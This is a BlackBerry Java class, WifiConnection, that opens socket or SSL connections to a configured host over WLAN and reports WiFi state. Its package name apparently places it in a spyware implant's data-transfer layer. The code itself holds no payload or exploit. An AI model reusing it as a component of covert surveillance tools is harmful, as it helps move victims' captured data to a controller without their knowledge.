package com.ht.rcs.blackberry.transfer;

import java.io.IOException;

import javax.microedition.io.Connector;
import javax.microedition.io.StreamConnection;

import net.rim.device.api.system.RadioInfo;
import net.rim.device.api.system.WLANInfo;

import com.ht.rcs.blackberry.utils.Check;
import com.ht.rcs.blackberry.utils.Debug;
import com.ht.rcs.blackberry.utils.DebugLevel;

public class WifiConnection extends Connection {
    static Debug debug = new Debug("Wifi", DebugLevel.VERBOSE);

    private String host;
    private int port;
    private boolean ssl;

    private int timeout = 3 * 60 * 1000;

    // Constructor
    public WifiConnection(String host_, int port_, boolean ssl_) {
        this.host = host_;
        this.port = port_;
        this.ssl = ssl_;
    }

    public synchronized boolean connect() {
        String url = "";
        if (ssl) {
            url = "ssl://" + host + ":" + port + ";ConnectionTimeout="
                    + timeout;

        } else {
            url = "socket://" + host + ":" + port
                    + ";ConnectionTimeout=" + timeout;
        }
        
        try {
            connection = (StreamConnection) Connector.open(url);
            in = connection.openDataInputStream();
            out = connection.openDataOutputStream();

            Check.ensures(connection != null, "connection_ null");
            Check.ensures(in != null, "in_ null");
            Check.ensures(out != null, "out_ null");

            connected = true;
        } catch (IOException e) {
            connected = false;
        }

        return connected;
    }

    protected void error(String string) {
        debug.error(string);
    }

    public synchronized boolean isActive() {
        boolean active = (RadioInfo.getActiveWAFs() & RadioInfo.WAF_WLAN) != 0;
        boolean connected = WLANInfo.getWLANState() == WLANInfo.WLAN_STATE_CONNECTED;

        debug.info("Active: " + active + " Connected: " + connected);
        return connected && active;
    }

    protected void trace(String string) {
        debug.trace(string);
    }

}
